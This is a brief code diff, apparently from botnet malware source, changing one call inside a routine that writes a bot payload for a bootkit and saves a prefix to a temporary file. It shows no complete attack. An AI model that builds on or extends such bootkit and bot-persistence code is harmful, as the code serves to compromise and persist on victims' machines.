@@ -427,7 +427,7 @@ static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		if( WriteBotForBootkit( dataBot, sizeBot ) )
 		{
 			//BOT::SaveSettings(true, false, false);
-			BOT::SavePrefixToTemporaryFile(true);
+			BOT::SavePrefixToTemporaryFile();
 			res = true;
 		}
 		if( delDataBot ) MemFree(dataBot);
